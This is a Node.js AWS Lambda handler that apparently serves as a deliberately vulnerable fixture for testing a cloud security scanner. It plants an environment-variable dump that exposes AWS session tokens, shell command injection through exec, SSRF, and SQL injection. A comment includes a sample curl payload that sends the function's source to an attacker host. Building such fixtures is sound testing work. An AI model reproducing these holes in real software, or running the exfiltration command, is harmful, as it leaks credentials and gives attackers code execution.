/**
 * =============================================================================
 * serverless/lambda.js – TigerGate CNAPP Test: Serverless Application Security
 * =============================================================================
 * PURPOSE: Demonstrate SAST / DAST vulnerabilities highly specific to Serverless.
 *
 * VULNERABILITIES COVERED:
 *   SV-CODE-001: OS Command Injection in Lambda (CWE-78)
 *   SV-CODE-002: SSRF to fetch AWS metadata from within Lambda (CWE-918)
 *   SV-CODE-003: Lambda environment variable dumping
 *   SV-CODE-004: Event injection (SQLi in Lambda)
 * =============================================================================
 */

const { exec } = require("child_process");
const https = require("https");
const mysql = require("mysql");

exports.handler = async (event) => {
    console.log("Event:", JSON.stringify(event));

    // 🔴 VULN (Serverless pattern): Leaking Lambda Env Vars
    // Attackers dumping `process.env` in Lambda will get the AWS Access Key / Session Token
    if (event.queryStringParameters && event.queryStringParameters.dump === "env") {
        return {
            statusCode: 200,
            body: JSON.stringify(process.env) // 🔴 Dumps AWS_SESSION_TOKEN and custom secrets!
        };
    }

    // 🔴 VULN: OS Command Injection in Lambda
    // payload: {"cmd": "curl -X POST -d @/var/task/lambda.js http://attacker.com/"}
    if (event.body) {
        let body = JSON.parse(event.body);
        if (body.cmd) {
            return new Promise((resolve) => {
                // 🔴 CWE-78: Executes arbitrary shell commands within the Lambda microVM container
                exec(body.cmd, (error, stdout, stderr) => {
                    resolve({ statusCode: 200, body: stdout || stderr || error.message });
                });
            });
        }
    }

    // 🔴 VULN: Server-Side Request Forgery (SSRF)
    if (event.queryStringParameters && event.queryStringParameters.url) {
        return new Promise((resolve) => {
            // 🔴 CWE-918: Unvalidated URL fetch 
            https.get(event.queryStringParameters.url, (resp) => {
                let data = '';
                resp.on('data', (chunk) => { data += chunk; });
                resp.on('end', () => { resolve({ statusCode: 200, body: data }); });
            }).on("error", (err) => {
                resolve({ statusCode: 500, body: err.message });
            });
        });
    }

    // 🔴 VULN: SQL Injection in Lambda
    const db = mysql.createConnection({
        host: "mydb.internal",
        user: "admin",
        password: process.env.DB_PASSWORD
    });

    if (event.queryStringParameters && event.queryStringParameters.userId) {
        let userId = event.queryStringParameters.userId;
        // 🔴 CWE-89: No parameterized queries
        db.query(`SELECT * FROM users WHERE id = ${userId}`, (error, results) => {
            // Processing omitted
        });
    }

    return { statusCode: 200, body: "Lambda executed successfully" };
};
